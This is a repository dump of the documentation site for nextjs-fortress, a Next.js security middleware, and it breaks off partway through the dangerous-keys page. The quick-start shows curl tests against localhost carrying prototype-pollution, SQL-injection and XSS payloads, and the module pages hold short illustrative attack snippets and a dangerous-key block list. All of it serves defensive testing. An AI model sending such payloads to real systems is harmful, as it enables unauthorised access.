@@ -1,0 +1,5967 @@
+Directory structure:
+└── docs/
+    ├── README.md
+    ├── docusaurus.config.ts
+    ├── package.json
+    ├── sidebars.ts
+    ├── tsconfig.json
+    ├── blog/
+    │   ├── 2019-05-28-first-blog-post.md
+    │   ├── 2019-05-29-long-blog-post.md
+    │   ├── 2021-08-01-mdx-blog-post.mdx
+    │   ├── authors.yml
+    │   ├── tags.yml
+    │   └── 2021-08-26-welcome/
+    │       └── index.md
+    ├── docs/
+    │   ├── intro.md
+    │   ├── motivation.md
+    │   ├── quick-start.md
+    │   ├── cve/
+    │   │   └── cve-2025-55182.md
+    │   ├── modules/
+    │   │   ├── csrf/
+    │   │   │   └── csrf-protection.md
+    │   │   ├── deserialization/
+    │   │   │   ├── circular-references.md
+    │   │   │   ├── dangerous-keys.md
+    │   │   │   ├── dangerous-patterns.md
+    │   │   │   └── depth-limiting.md
+    │   │   ├── encoding/
+    │   │   │   └── ghost-mode.md
+    │   │   ├── injection/
+    │   │   │   ├── code-injection.md
+    │   │   │   ├── command-injection.md
+    │   │   │   ├── sql-injection.md
+    │   │   │   └── xss-protection.md
+    │   │   └── rate-limit/
+    │   │       └── rate-limiting.md
+    │   ├── tutorial-extras/
+    │   │   ├── _category_.json
+    │   │   ├── manage-docs-versions.md
+    │   │   └── translate-your-site.md
+    │   └── wrappers/
+    │       ├── api-route.md
+    │       └── server-action.md
+    ├── src/
+    │   ├── components/
+    │   │   └── HomepageFeatures/
+    │   │       ├── index.tsx
+    │   │       └── styles.module.css
+    │   ├── css/
+    │   │   └── custom.css
+    │   └── pages/
+    │       ├── index.module.css
+    │       ├── index.tsx
+    │       └── markdown-page.md
+    └── static/
+        └── .nojekyll
+
+================================================
+FILE: README.md
+================================================
+# Website
+
+This website is built using [Docusaurus](https://docusaurus.io/), a modern static website generator.
+
+## Installation
+
+```bash
+yarn
+```
+
+## Local Development
+
+```bash
+yarn start
+```
+
+This command starts a local development server and opens up a browser window. Most changes are reflected live without having to restart the server.
+
+## Build
+
+```bash
+yarn build
+```
+
+This command generates static content into the `build` directory and can be served using any static contents hosting service.
+
+## Deployment
+
+Using SSH:
+
+```bash
+USE_SSH=true yarn deploy
+```
+
+Not using SSH:
+
+```bash
+GIT_USER=<Your GitHub username> yarn deploy
+```
+
+If you are using GitHub pages for hosting, this command is a convenient way to build the website and push to the `gh-pages` branch.
+
+
+
+================================================
+FILE: docusaurus.config.ts
+================================================
+import {themes as prismThemes} from 'prism-react-renderer';
+import type {Config} from '@docusaurus/types';
+import type * as Preset from '@docusaurus/preset-classic';
+
+const config: Config = {
+  title: 'nextjs-fortress',
+  tagline: 'Security Validation middleware for Next.js',
+  favicon: 'img/logo.png',
+
+  url: 'https://mindfiredigital.github.io',
+  baseUrl: '/nextjs-fortress/',
+
+  organizationName: 'mindfiredigital',
+  projectName: 'nextjs-fortress',
+
+  onBrokenLinks: 'throw',
+  onBrokenMarkdownLinks: 'warn',
+
+  i18n: {
+    defaultLocale: 'en',
+    locales: ['en'],
+  },
+
+  presets: [
+    [
+      'classic',
+      {
+        docs: {
+          sidebarPath: './sidebars.ts',
+          editUrl: 'https://github.com/mindfiredigital/nextjs-fortress/tree/main/docs/',
+        },
+        blog: false,
+        theme: {
+          customCss: './src/css/custom.css',
+        },
+      } satisfies Preset.Options,
+    ],
+  ],
+
+  themeConfig: {
+    image: 'img/social-card.png',
+    navbar: {
+      title: 'nextjs-fortress',
+      logo: {
+        alt: 'nextjs-fortress Logo',
+        src: 'img/logo.png',
+      },
+      items: [
+        {
+          type: 'docSidebar',
+          sidebarId: 'tutorialSidebar',
+          position: 'left',
+          label: 'Docs',
+        },
+        // {to: '/blog', label: 'Blog', position: 'left'},
+        {
+          href: 'https://github.com/mindfiredigital/nextjs-fortress',
+          label: 'GitHub',
+          position: 'right',
+        },
+      ],
+    },
+    footer: {
+      style: 'dark',
+      links: [
+        {
+          title: 'Docs',
+          items: [
+            {
+              label: 'Introduction',
+              to: '/docs/intro',
+            },
+            {
+              label: 'Quick Start',
+              to: '/docs/quick-start',
+            },
+          ],
+        },
+        {
+          title: 'More',
+          items: [
+            {
+              label: 'GitHub',
+              href: 'https://github.com/mindfiredigital/nextjs-fortress',
+            },
+          ],
+        },
+      ],
+      copyright: `Copyright Â© ${new Date().getFullYear()} nextjs-fortress. Built with Docusaurus.`,
+    },
+    prism: {
+      theme: prismThemes.github,
+      darkTheme: prismThemes.dracula,
+    },
+  } satisfies Preset.ThemeConfig,
+};
+
+export default config;
+
+
+================================================
+FILE: package.json
+================================================
+{
+  "name": "docs",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "docusaurus": "docusaurus",
+    "start": "docusaurus start",
+    "build": "docusaurus build",
+    "swizzle": "docusaurus swizzle",
+    "deploy": "docusaurus deploy",
+    "clear": "docusaurus clear",
+    "serve": "docusaurus serve",
+    "write-translations": "docusaurus write-translations",
+    "write-heading-ids": "docusaurus write-heading-ids",
+    "typecheck": "tsc"
+  },
+  "dependencies": {
+    "@docusaurus/core": "3.9.2",
+    "@docusaurus/preset-classic": "3.9.2",
+    "@mdx-js/react": "^3.0.0",
+    "clsx": "^2.0.0",
+    "lucide-react": "^0.562.0",
+    "prism-react-renderer": "^2.3.0",
+    "react": "^19.0.0",
+    "react-dom": "^19.0.0",
+    "react-icons": "^5.5.0"
+  },
+  "devDependencies": {
+    "@docusaurus/module-type-aliases": "3.9.2",
+    "@docusaurus/tsconfig": "3.9.2",
+    "@docusaurus/types": "3.9.2",
+    "typescript": "~5.6.2"
+  },
+  "browserslist": {
+    "production": [
+      ">0.5%",
+      "not dead",
+      "not op_mini all"
+    ],
+    "development": [
+      "last 3 chrome version",
+      "last 3 firefox version",
+      "last 5 safari version"
+    ]
+  },
+  "engines": {
+    "node": ">=20.0"
+  }
+}
+
+
+
+================================================
+FILE: sidebars.ts
+================================================
+import type {SidebarsConfig} from '@docusaurus/plugin-content-docs';
+
+const sidebars: SidebarsConfig = {
+  tutorialSidebar: [
+    'intro',
+    'motivation',
+    'quick-start',
+    {
+      type: 'category',
+      label: 'Security Modules',
+      collapsible: true,
+      collapsed: false,
+      items: [
+        {
+          type: 'category',
+          label: 'Deserialization Protection',
+          items: [
+            'modules/deserialization/dangerous-keys',
+            'modules/deserialization/depth-limiting',
+            'modules/deserialization/circular-references',
+            'modules/deserialization/dangerous-patterns',
+          ],
+        },
+        {
+          type: 'category',
+          label: 'Injection Detection',
+          items: [
+            'modules/injection/sql-injection',
+            'modules/injection/command-injection',
+            'modules/injection/xss-protection',
+            'modules/injection/code-injection',
+          ],
+        },
+        {
+          type: 'category',
+          label: 'Encoding Validation',
+          items: [
+            'modules/encoding/ghost-mode',
+          ],
+        },
+        {
+          type: 'category',
+          label: 'CSRF Protection',
+          items: [
+            'modules/csrf/csrf-protection',
+          ],
+        },
+        {
+          type: 'category',
+          label: 'Rate Limiting',
+          items: [
+            'modules/rate-limit/rate-limiting',
+          ],
+        },
+      ],
+    },
+    {
+      type: 'category',
+      label: 'Security Wrappers',
+      collapsible: true,
+      collapsed: false,
+      items:[
+        'wrappers/api-route',
+        'wrappers/server-action',
+      ]
+    },
+    {
+      type: 'category',
+      label: 'About CVEs',
+      collapsible: true,
+      collapsed: false,
+      items:[
+        {
+          type: 'category',
+          label: 'cve-2025-55182',
+          items: [
+            'cve/cve-2025-55182',
+          ],
+        }
+      ]
+    }
+  ],
+};
+
+export default sidebars;
+
+
+================================================
+FILE: tsconfig.json
+================================================
+{
+  // This file is not used in compilation. It is here just for a nice editor experience.
+  "extends": "@docusaurus/tsconfig",
+  "compilerOptions": {
+    "baseUrl": "."
+  },
+  "exclude": [".docusaurus", "build"]
+}
+
+
+
+================================================
+FILE: blog/2019-05-28-first-blog-post.md
+================================================
+---
+slug: first-blog-post
+title: First Blog Post
+authors: [slorber, yangshun]
+tags: [hola, docusaurus]
+---
+
+Lorem ipsum dolor sit amet...
+
+<!-- truncate -->
+
+...consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+
+
+================================================
+FILE: blog/2019-05-29-long-blog-post.md
+================================================
+---
+slug: long-blog-post
+title: Long Blog Post
+authors: yangshun
+tags: [hello, docusaurus]
+---
+
+This is the summary of a very long blog post,
+
+Use a `<!--` `truncate` `-->` comment to limit blog post size in the list view.
+
+<!-- truncate -->
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet
+
+
+
+================================================
+FILE: blog/2021-08-01-mdx-blog-post.mdx
+================================================
+---
+slug: mdx-blog-post
+title: MDX Blog Post
+authors: [slorber]
+tags: [docusaurus]
+---
+
+Blog posts support [Docusaurus Markdown features](https://docusaurus.io/docs/markdown-features), such as [MDX](https://mdxjs.com/).
+
+:::tip
+
+Use the power of React to create interactive blog posts.
+
+:::
+
+{/* truncate */}
+
+For example, use JSX to create an interactive button:
+
+```js
+<button onClick={() => alert('button clicked!')}>Click me!</button>
+```
+
+<button onClick={() => alert('button clicked!')}>Click me!</button>
+
+
+
+================================================
+FILE: blog/authors.yml
+================================================
+yangshun:
+  name: Yangshun Tay
+  title: Ex-Meta Staff Engineer, Co-founder GreatFrontEnd
+  url: https://linkedin.com/in/yangshun
+  image_url: https://github.com/yangshun.png
+  page: true
+  socials:
+    x: yangshunz
+    linkedin: yangshun
+    github: yangshun
+    newsletter: https://www.greatfrontend.com
+
+slorber:
+  name: SÃ©bastien Lorber
+  title: Docusaurus maintainer
+  url: https://sebastienlorber.com
+  image_url: https://github.com/slorber.png
+  page:
+    # customize the url of the author page at /blog/authors/<permalink>
+    permalink: '/all-sebastien-lorber-articles'
+  socials:
+    x: sebastienlorber
+    linkedin: sebastienlorber
+    github: slorber
+    newsletter: https://thisweekinreact.com
+
+
+
+================================================
+FILE: blog/tags.yml
+================================================
+facebook:
+  label: Facebook
+  permalink: /facebook
+  description: Facebook tag description
+
+hello:
+  label: Hello
+  permalink: /hello
+  description: Hello tag description
+
+docusaurus:
+  label: Docusaurus
+  permalink: /docusaurus
+  description: Docusaurus tag description
+
+hola:
+  label: Hola
+  permalink: /hola
+  description: Hola tag description
+
+
+
+================================================
+FILE: blog/2021-08-26-welcome/index.md
+================================================
+---
+slug: welcome
+title: Welcome
+authors: [slorber, yangshun]
+tags: [facebook, hello, docusaurus]
+---
+
+[Docusaurus blogging features](https://docusaurus.io/docs/blog) are powered by the [blog plugin](https://docusaurus.io/docs/api/plugins/@docusaurus/plugin-content-blog).
+
+Here are a few tips you might find useful.
+
+<!-- truncate -->
+
+Simply add Markdown files (or folders) to the `blog` directory.
+
+Regular blog authors can be added to `authors.yml`.
+
+The blog post date can be extracted from filenames, such as:
+
+- `2019-05-30-welcome.md`
+- `2019-05-30-welcome/index.md`
+
+A blog post folder can be convenient to co-locate blog post images:
+
+![Docusaurus Plushie](./docusaurus-plushie-banner.jpeg)
+
+The blog supports tags as well!
+
+**And if you don't want a blog**: just delete this directory, and use `blog: false` in your Docusaurus config.
+
+
+
+================================================
+FILE: docs/intro.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x8f in position 1710: character maps to <undefined>
+
+
+================================================
+FILE: docs/motivation.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x9d in position 2462: character maps to <undefined>
+
+
+================================================
+FILE: docs/quick-start.md
+================================================
+# Quick Start Guide
+
+Get your Next.js application protected from CVE-2025-55182 in under 5 minutes.
+
+## Prerequisites
+
+- Next.js 12.0.0 or higher
+- Node.js 16.0.0 or higher
+
+## Demo Video
+
+[![Watch the NextJS Fortress Demo](../../packages/nextjs-fortress/public/@mindfiredigitalnextjs-fortress.png)](https://youtu.be/u2sZN_lTsGo)
+
+## Step 1: Install 
+
+```bash
+npm install @mindfiredigital/nextjs-fortress
+```
+
+Or use the CLI:  
+
+```bash
+npx fortress init
+```
+
+The CLI will:
+- Detect your Next.js version
+- Create `fortress.config.ts`
+- Create `middleware.ts`
+- Generate `.env.example`
+- Create example API route
+
+## Step 2: Configuration file gets created
+
+`fortress.config.ts` in your project root gets created:
+
+```typescript
+// fortress.config.ts
+import { FortressConfig } from 'nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development', // Change to 'production' when deploying
+
+  logging: {
+    enabled: true,
+    level: 'debug',
+    destination: 'console',
+  },
+
+  modules: {
+    // 1. Deserialization Protection (CVE-2025-55182)
+    deserialization: {
+      enabled: true,
+      maxDepth: 10,
+      detectCircular: true,
+    },
+
+    // 2. Injection Detection
+    injection: {
+      enabled: true,
+      checks: ['sql', 'command', 'xss', 'codeInjection'],
+    },
+
+    // 3. Encoding Validation (Ghost Mode Protection)
+    encoding: {
+      enabled: true,
+      blockNonUTF8: true,
+      detectBOM: true,
+    },
+
+    // 4. CSRF Protection (disable in development)
+    csrf: {
+      enabled: false, // Enable in production
+      cookieName: '_csrf',
+      tokenSecret: process.env.CSRF_SECRET,
+    },
+
+    // 5. Rate Limiting
+    rateLimit: {
+      enabled: true,
+      byIP: {
+        requests: 100,
+        window: 60000, // 100 requests per minute
+      },
+    },
+
+    // 6. Content Validation
+    content: {
+      enabled: true,
+      maxPayloadSize: 1024 * 1024, // 1MB
+    },
+
+    // 7. Security Headers
+    securityHeaders: {
+      enabled: true,
+    },
+  },
+
+  whitelist: {
+    paths: ['/_next', '/favicon.ico'],
+    ips: [],
+  },
+
+  onSecurityEvent: async (event) => {
+    console.warn('ðŸš¨ Security Event:', {
+      type: event.type,
+      severity: event.severity,
+      message: event.message,
+      ip: event.request.ip,
+      path: event.request.path,
+    });
+  },
+};
+```
+
+## Step 3: Middleware Integration
+
+### Option 1: New Project (No Existing Middleware)
+
+If you don't have a `middleware.ts` file, create one:
+
+```typescript
+
+import { createFortressMiddleware } from '@mindfiredigital/nextjs-fortress'
+import { fortressConfig } from './fortress.config'
+
+export const middleware = createFortressMiddleware(fortressConfig)
+
+export const config = {
+  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
+}
+```
+
+---
+
+### Option 2: Existing Middleware (Simple Integration)
+
+If you already have middleware, wrap your existing logic with Fortress:
+
+**Before (Your existing middleware):**
+```typescript
+import { NextRequest, NextResponse } from 'next/server'
+
+// This is exactly what is happening inside the "custom logic" part
+export async function middleware(request: NextRequest) {
+  const response = NextResponse.next()
+  response.headers.set('x-custom', 'value')
+  return response
+}
+
+export const config = {
+  matcher: ['/api/:path*'],
+}
+```
+
+**After (With Fortress protection):**
+```typescript
+import { createFortressMiddleware } from '@mindfiredigital/nextjs-fortress'
+import { fortressConfig } from './fortress.config'
+import { NextRequest, NextResponse } from 'next/server'
+
+// Option 1: Simple
+// export const middleware = createFortressMiddleware(fortressConfig)
+
+// Option 2: With custom logic - NO TYPE ERRORS
+async function myMiddleware(request: NextRequest) {
+  const response = NextResponse.next()
+  response.headers.set('x-custom', 'value')
+  return response
+}
+
+export const middleware = createFortressMiddleware(fortressConfig, myMiddleware)
+```
+
+---
+
+### Option 3: Middleware implementation in custom allowed paths
+
+```typescript
+import { createSelectiveFortressMiddleware } from '@mindfiredigital/nextjs-fortress'
+import { fortressConfig } from './fortress.config'
+import { NextRequest, NextResponse } from 'next/server'
+
+// Your existing custom middleware logic
+async function myMiddleware(request: NextRequest) {
+  const response = NextResponse.next()
+  response.headers.set('x-custom', 'value')
+  response.headers.set('x-app-version', '1.0.0')
+  return response
+}
+
+export const middleware = createSelectiveFortressMiddleware(
+  fortressConfig,
+  {
+    // Routes that MUST be protected by Fortress
+    protectedPaths: [
+      '/api/test',           // Your test endpoint
+      '/api/admin/*',        // All admin routes
+      '/api/secure/*',       // All secure routes
+    ],
+    
+    // Routes that should NEVER be protected
+    excludedPaths: [
+      '/api/public/*',       // Public endpoints
+      '/api/health',         // Health check
+    ],
+    
+    // Your custom middleware runs on ALL routes
+    customMiddleware: myMiddleware
+  }
+)
+
+export const config = {
+  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
+}
+```
+
+## Step 4: Test Protection
+
+### Option 1: Test with the built in frontend
+
+The demo app provides a hands-on interface to test all security protections with 15+ pre-configured attack vectors.
+
+#### Running the Demo
+
+```bash
+git clone https://github.com/mindfiredigital/nextjs-fortress.git
+cd examples/demoApp
+pnpm install
+pnpm dev
+```
+
+### Option 2: Self Testing
+
+#### Create Test API Route
+
+```typescript
+// app/api/test/route.ts
+import { NextRequest, NextResponse } from 'next/server';
+
+export async function POST(request: NextRequest) {
+  try {
+    const body = await request.json();
+    
+    return NextResponse.json({
+      success: true,
+      message: 'Request validated by Fortress',
+      data: body,
+    });
+  } catch (error) {
+    return NextResponse.json(
+      { error: 'Invalid request' },
+      { status: 400 }
+    );
+  }
+}
+
+export async function GET() {
+  return NextResponse.json({
+    message: 'Fortress Active',
+    protections: [
+      'Deserialization (CVE-2025-55182)',
+      'SQL Injection',
+      'XSS Attacks',
+      'Command Injection',
+      'Encoding Bypass (Ghost Mode)',
+      'Rate Limiting',
+      'Security Headers',
+    ],
+  });
+}
+```
+
+
+#### Test 1: Prototype Pollution (CVE-2025-55182)
+
+```bash
+curl -X POST http://localhost:3000/api/test \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__": {"isAdmin": true}}'
+```
+
+**Expected Response:**
+```json
+{
+  "error": "Dangerous key detected: \"__proto__\"",
+  "rule": "dangerous_key"
+}
+```
+**Status:** 403 Forbidden 
+
+#### Test 2: SQL Injection
+
+```bash
+curl -X POST http://localhost:3000/api/test \
+  -H "Content-Type: application/json" \
+  -d '{"query": "SELECT * FROM users WHERE id=1 OR 1=1"}'
+```
+
+**Expected Response:**
+```json
+{
+  "error": "SQL injection detected: \"OR 1=1\"",
+  "rule": "sql_injection"
+}
+```
+**Status:** 403 Forbidden 
+
+#### Test 3: XSS Attack
+
+```bash
+curl -X POST http://localhost:3000/api/test \
+  -H "Content-Type: application/json" \
+  -d '{"comment": "<script>alert(1)</script>"}'
+```
+
+**Expected Response:**
+```json
+{
+  "error": "XSS injection detected: \"<script>\"",
+  "rule": "xss_injection"
+}
+```
+**Status:** 403 Forbidden 
+
+#### Test 4: Rate Limiting
+
+```bash
+# Run this 101 times quickly
+for i in {1..101}; do
+  curl -X POST http://localhost:3000/api/test \
+    -H "Content-Type: application/json" \
+    -d '{"test": "data"}'
+done
+```
+
+**After 100 requests:**
+```
+Status: 429 Too Many Requests
+Retry-After: 45
+```
+Rate limit working!
+
+## Environment Variables
+
+Create `.env.local`:
+
+```bash
+# CSRF Secret (generate with: openssl rand -hex 32)
+CSRF_SECRET=your-32-character-secret-key-here
+
+# Whitelisted IPs (comma-separated)
+WHITELIST_IPS=127.0.0.1,::1
+```
+
+## What Happens Now
+
+### Every Request Is Protected
+
+```typescript
+// Before reaching your code, fortress validates:
+
+1. âœ“ No dangerous keys (__proto__, constructor, prototype)
+2. âœ“ No SQL injection patterns
+3. âœ“ No XSS attempts
+4. âœ“ No command injection
+5. âœ“ No encoding bypasses
+6. âœ“ Depth limit not exceeded
+7. âœ“ No circular references
+8. âœ“ Rate limit not exceeded
+9. âœ“ Payload size within limit
+10. âœ“ Valid content type
+
+// If all checks pass â†’ Your handler executes
+// If any check fails â†’ 403 Forbidden + logged
+```
+
+### Security Events Are Logged
+
+```typescript
+// Console output when attack detected:
+ðŸš¨ Security Event: {
+  type: 'deserialization',
+  severity: 'critical',
+  message: 'Dangerous key detected: "__proto__"',
+  ip: '192.168.1.100',
+  path: '/api/test',
+  rule: 'dangerous_key',
+  confidence: 1.0,
+  timestamp: 2025-01-07T10:30:00.000Z
+}
+```
+
+## Next Steps
+
+Now that you're protected:
+
+1. **Monitor Security Events** - Watch console for attacks
+2. **Customize Configuration** - Adjust limits for your needs
+3. **Add Monitoring** - Send events to Sentry, DataDog, etc.
+4. **Test Thoroughly** - Ensure it doesn't break your app
+5. **Deploy to Production** - Enable CSRF and production mode
+
+## Additional Resources
+
+- [CVE-2025-55182 Details](./cve/cve-2025-55182.md)
+- [modular-overview](./modules/deserialization/dangerous-keys.md)
+
+## Getting Help
+
+- [Report Issues](https://github.com/mindfiredigital/nextjs-fortress/issues)
+
+---
+
+**Congratulations!** Your Next.js application is now protected from CVE-2025-55182 and all major attack vectors.
+
+
+================================================
+FILE: docs/cve/cve-2025-55182.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x8f in position 1462: character maps to <undefined>
+
+
+================================================
+FILE: docs/modules/csrf/csrf-protection.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x8f in position 6738: character maps to <undefined>
+
+
+================================================
+FILE: docs/modules/deserialization/circular-references.md
+================================================
+# Circular Reference Detection
+
+## Overview
+
+Circular reference detection prevents attackers from sending self-referencing objects that can cause infinite loops, memory exhaustion, and application crashes.
+
+## Why This Is Important
+
+### The Problem: Self-Referencing Objects
+
+Attackers can craft payloads where objects reference themselves, creating circular dependencies:
+
+#### 1. **Infinite Loop Attack**
+
+```javascript
+// Attacker creates circular reference
+const malicious = { name: "user" };
+malicious.self = malicious; // References itself
+
+// Without protection, this happens:
+JSON.stringify(malicious);
+// TypeError: Converting circular structure to JSON
+
+// Serialization libraries try to traverse:
+function serialize(obj) {
+  for (const key in obj) {
+    serialize(obj[key]); // Infinite recursion
+  }
+}
+```
+
+**What Happens Without Protection:**
+- Serialization fails
+- Stack overflow errors
+- Application crashes
+- Server becomes unresponsive
+
+**Impact:** Server crashes and immediate downtime Infinite loops consume CPU Stack overflow errors Denial of Service (DoS)
+
+#### 2. **Memory Exhaustion**
+
+```javascript
+// Circular reference with deep nesting
+const attack = { level1: {} };
+attack.level1.level2 = { level3: attack };
+
+// Validator tries to traverse:
+function validate(obj, seen = []) {
+  seen.push(obj);
+  for (const value of Object.values(obj)) {
+    if (!seen.includes(value)) {
+      validate(value, seen); // Keeps growing 'seen' array
+    }
+  }
+}
+```
+
+**What Happens Without Protection:**
+- Validation code traverses repeatedly
+- Memory usage grows exponentially
+- Garbage collector struggles
+- Server runs out of memory
+
+**Impact:**
+- Memory exhaustion and OOM errors
+- Performance degradation
+- CPU spikes during GC
+- Affects all users
+
+#### 3. **JSON Serialization DoS**
+
+```javascript
+// Many APIs serialize responses
+app.post('/api/user', async (req, res) => {
+  const userData = await req.json(); // Contains circular ref
+  
+  // Later in the code:
+  await db.save(JSON.stringify(userData)); // Crash
+  
+  // Or
+  return res.json(userData); // Crash
+});
+```
+
+**What Happens Without Protection:**
+- JSON.stringify() throws error
+- API endpoint crashes
+- Error propagates
+- Service becomes unavailable
+
+**Impact:** API endpoint crashes Service unavailability Error cascades Lost revenue
+
+#### 4. **Database Corruption**
+
+```javascript
+// Circular data sent to database
+const user = {
+  name: "attacker",
+  profile: {}
+};
+user.profile.owner = user; // Circular
+
+// Without protection:
+await db.users.insert(user); // Database tries to serialize
+// Error: cannot insert circular structure
+// But connection may be left in bad state
+```
+
+**What Happens Without Protection:**
+- Database driver fails
+- Connection corruption
+- Transaction rollback
+- Data inconsistency
+
+**Impact:**
+- Database connection issues
+- Transaction failures
+- Data inconsistency
+- Application instability
+
+## How nextjs-fortress Solves This
+
+### The Algorithm
+
+```typescript
+/**
+ * Check for circular references using WeakSet
+ */
+private checkCircularReferences(
+  obj: unknown,
+  seen = new WeakSet()
+): ValidationResult {
+  if (obj === null || typeof obj !== 'object') {
+    return { valid: true };
+  }
+
+  // Check if we've seen this object before
+  if (seen.has(obj)) {
+    return {
+      valid: false,
+      severity: 'high',
+      message: 'Circular reference detected in payload',
+      rule: 'circular_reference',
+      confidence: 1.0,
+    };
+  }
+
+  // Mark this object as seen
+  seen.add(obj);
+
+  // Recursively check all nested values
+  for (const value of Object.values(obj)) {
+    if (value !== null && typeof value === 'object') {
+      const result = this.checkCircularReferences(value, seen);
+      if (!result.valid) {
+        return result;
+      }
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+### Why This Works
+
+**1. WeakSet Tracking** - Efficiently tracks seen objects without preventing garbage collection
+**2. Early Detection** - Stops immediately when circular reference found
+**3. Memory Safe** - WeakSet doesn't prevent GC of tracked objects
+**4. Fast Performance** - O(n) time complexity
+
+### WeakSet Advantages
+
+```typescript
+// Traditional approach (BAD)
+const seen = []; // Array grows indefinitely
+seen.includes(obj); // O(n) lookup
+
+// Fortress approach (GOOD)
+const seen = new WeakSet(); // Doesn't prevent GC
+seen.has(obj); // O(1) lookup
+```
+
+## How to Initialize
+
+```typescript
+import { FortressConfig } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    deserialization: {
+      enabled: true,
+      maxDepth: 10,
+      detectCircular: true,      // Enable this!
+      
+      blockList: [
+        '__proto__',
+        'constructor',
+        'prototype',
+      ],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.detection.rule === 'circular_reference') {
+      console.warn('Circular reference attack blocked:', {
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without circular reference detection:**
+- Infinite loops crash server
+- Memory exhaustion
+- JSON serialization failures
+- Database corruption
+
+**What nextjs-fortress provides:**
+- WeakSet-based detection
+- Early attack prevention
+- Memory-safe implementation
+- Zero performance impact
+
+**How to initialize:**
+```typescript
+deserialization: {
+  enabled: true,
+  detectCircular: true,  // Enable circular detection
+  maxDepth: 10,
+}
+```
+
+---
+
+**Related Documentation:**
+- [Dangerous Keys Detection](./dangerous-keys.md)
+- [Depth Limiting](./depth-limiting.md)
+- [Dangerous Patterns](./dangerous-patterns.md)
+
+
+================================================
+FILE: docs/modules/deserialization/dangerous-keys.md
+================================================
+# Dangerous Keys Detection
+
+## Overview
+
+Dangerous keys detection is the **primary defense** against prototype pollution attacks, including CVE-2025-55182. It identifies and blocks object properties that can modify JavaScript's prototype chain.
+
+## Why This Is Important
+
+### The Problem: Prototype Pollution
+
+JavaScript's prototype chain is fundamental but dangerous. Every object inherits from `Object.prototype`, and modifying it affects **every object in your application**.
+
+#### 1. **The `__proto__` Attack**
+
+```javascript
+// Attacker sends this payload
+const malicious = {
+  "username": "admin",
+  "__proto__": {
+    "isAdmin": true
+  }
+};
+
+// Without protection:
+Object.prototype.isAdmin = true;
+
+// Now EVERY object is an admin
+const normalUser = {};
+console.log(normalUser.isAdmin); // true 
+
+// Authentication bypass
+function checkAdmin(user) {
+  if (user.isAdmin) {
+    return "ACCESS GRANTED";
+  }
+  return "ACCESS DENIED";
+}
+
+checkAdmin({}); // "ACCESS GRANTED" 
+```
+
+**What Happens Without Protection:**
+- All objects inherit malicious properties
+- Authentication logic bypassed
+
+**Impact:**
+- Complete security bypass - Any user becomes admin
+- Unauthorized access to all data
+- Financial fraud possible
+- Loss of customer trust
+
+#### 2. **The `constructor` Attack**
+
+```javascript
+// Attacker payload
+const malicious = {
+  "constructor": {
+    "prototype": {
+      "infected": true,
+      "executeCode": function() {
